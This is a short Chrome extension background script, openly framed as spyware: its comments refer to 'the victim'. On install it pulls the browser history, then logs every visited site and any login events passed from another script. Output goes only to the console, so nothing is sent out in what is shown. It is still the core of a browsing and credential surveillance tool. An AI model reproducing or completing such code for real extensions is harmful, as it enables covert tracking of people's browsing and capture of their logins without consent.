chrome.runtime.onInstalled.addListener(function() {
    // Retrieves the browser history of the victim for the last 24 hours on install
    chrome.history.search({text: ''}, function(results) {
        results.forEach(function(page){
            console.log(page.url);
        });
    });
    // Adds listener that will log all sites visited by victim
	chrome.history.onVisited.addListener(function(result) {
        console.log(result.url);
    });
});
//chrome.runtime.onSuspend.addListener(function() {
    
//});
chrome.runtime.onMessage.addListener(function(request, sender) {
    console.log("Login detected: " + request.loginListener);
});